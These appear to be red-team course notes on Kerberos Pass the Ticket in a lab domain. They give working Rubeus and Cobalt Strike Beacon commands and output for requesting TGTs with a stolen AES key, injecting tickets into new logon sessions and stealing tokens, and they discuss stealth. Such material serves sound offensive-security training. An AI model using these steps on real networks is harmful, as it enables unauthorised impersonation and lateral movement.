
_Pass the Ticket_ (or PtT), is a technique [T1550.003](https://attack.mitre.org/techniques/T1550/003/) that allows an adversary to leverage stolen, forged, or requested Kerberos tickets for user impersonation.  As with PtH, this can be implemented in different ways.  Tools like Impacket implement the Kerberos protocol for remote authentication, and tools like Rubeus inject tickets into the credential cache of a given logon session.

PtT is superior to PtH in a few important aspects.  Kerberos authentication is not anomalous, nor is it restricted as with NTLM; and passing tickets into a logon session can be done with native Windows APIs, so it does not rely on patching LSASS memory.  This makes it more stealthy, and isn't prevented by PPL.

### Requesting TGTs

We already saw in the [Credential Access](https://www.zeropointsecurity.co.uk/path-player?courseid=red-team-ops&unit=67851a86ba9789af1107f5f9) section how Kerberos tickets can be extracted from memory.  But the adversary can also legitimately request Kerberos tickets on behalf of a user if they have their NTLM hash or AES encryption keys.  Using an NTLM hash will return RC4-encrypted tickets, which is generally not advisable.

Rubeus' `asktgt` command can be used with a user's AES key.  This will return a ticket in base64 encoded format.

```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:rsteel /domain:CONTOSO.COM /aes256:05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960 /nowrap

[*] Action: Ask TGT

[*] Using aes256_cts_hmac_sha1 hash: 05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960
[*] Building AS-REQ (w/ preauth) for: 'CONTOSO.COM\rsteel'
[*] Using domain controller: 10.10.120.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFo[...snip...]kNPTQ==

  ServiceName              :  krbtgt/CONTOSO.COM
  ServiceRealm             :  CONTOSO.COM
  UserName                 :  rsteel (NT_PRINCIPAL)
  UserRealm                :  CONTOSO.COM
  StartTime                :  17/02/2025 13:18:21
  EndTime                  :  17/02/2025 23:18:21
  RenewTill                :  24/02/2025 13:18:21
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  7ImgleIR6fnHZCxJW7MJUCabAjxvIsMS7Z55VRPaEHU=
  ASREP (key)              :  05579261E29FB01F23B007A89596353E605AE307AFCD1AD3234FA12F94EA696
```

## Injecting TGTs

Beacon has a `kerberos_ticket_use` command, which applies the given TGT to the current session.  The ticket must exist as a .kirbi file on the computer running the Cobalt Strike client.  If you have a base64 encoded ticket from Rubeus, you can write it to disk using PowerShell.

```powershell
$ticket = "doIFo[...snip...]kNPTQ=="
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String($ticket))
```

If you pass a TGT into a logon session that already has one, then you'll overwrite the existing ticket.  For example, if your Beacon is running in the context of pchilds and you inject a TGT for rsteel into the current session, pchilds' TGT will be replaced with rsteel's.  We want to avoid clobbering tickets as much as possible because, although we want to leverage the ticket, we don't want to impact the real user's access to services in the domain.

The optimal strategy is to create a new logon session that we can impersonate.  This lets us use the Kerberos ticket, without affecting a user's existing logon session.  Before doing so, this `klist` output shows our current LUID is **0x11f831e**.  It contains a TGT and LDAP service ticket for pchilds.

![[Pasted image 20250710224809.png]]

Create a new logon session using `make_token`, providing a fake password (this assumes that we don't know the user's plaintext password).

```powershell
beacon> make_token CONTOSO\rsteel FakePass
[+] Impersonated CONTOSO\rsteel (netonly)
```

Running `klist` again shows that our current LUID has changed, and there are no tickets in its cache.

![[Pasted image 20250710224949.png]]

Next, `kerberos_ticket_use` will inject the given ticket into this new session.

```powershell
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi
```

The klist output will now show the injected ticket.

![[Pasted image 20250710225017.png]]

Any Kerberos authentication that the Beacon now performs will be under the context of rsteel.  If at any point you want to remove the tickets from this session, but without actually disposing of the session itself, use `kerberos_ticket_purge`.  When we no longer need the session, use `rev2self` to dispose of it, and the Beacon session goes back to pchilds' context.

### The Rubeus way
There are some limitations with Beacon's built-in `kerberos_ticket_use` command.  The first is that it will only inject TGTs and not service tickets.  The second is that it only accepts .kirbi files on disk, which can be cumbersome.

Rubeus' `ptt` command can inject both TGTs and service ticket, and can accept base64 encoded tickets.  The syntax is `ptt /luid:[luid] /ticket:[ticket]`.  The ticket parameter can be the base64 encoded ticket, or a path to a .kirbi on disk (in this case it would be the disk of the machine Beacon is running on, not the machine running the CS client).

Rubeus also has a `createnetonly` command which can be used instead of Beacon's `make_token` command.  This spawns a hidden process in a new logon session and returns the PID and LUID.

```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\notepad.exe /username:rsteel /domain:CONTOSO.COM /password:FakePass

[*] Action: Create Process (/netonly)

[*] Using CONTOSO.COM\rsteel:FakePass

[*] Showing process : False
[*] Username        : rsteel
[*] Domain          : CONTOSO.COM
[*] Password        : FakePass
[+] Process         : 'C:\Windows\notepad.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 2524
[+] LUID            : 0x132ef34
```

A ticket can then be injected.

```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:0x132ef34 /ticket:doIFoDC<SNIP>TAyMjQxMzQyMza3JidGd0GwtDT05UT1NPLkNPTQ==

[*] Action: Import Ticket
[*] Target LUID: 0x132ef34
[+] Ticket successfully imported!
```

Then steal the token of the spawned process to utilise the ticket.

```powershell
beacon> steal_token 2524
[+] Impersonated CONTOSO\pchilds
```

To drop the impersonation, run `rev2self` then terminate the spawned process using Beacon's `kill` command.

> This worked but it's a logon type 9 so the network credentials will be for rsteel

### The getuid Confusion

> Many students see the above output of `steal_token` and are confused as to why it would say _pchilds_ and not _rsteel_.  This is because the user information returned by `steal_token` and `getuid` is taken from the primary access token of the process.  It does not matter if you pass alternate credential material into the logon session to which the process is linked, either by PtH or PtT, the username returned will always be that of the user that spawned the process.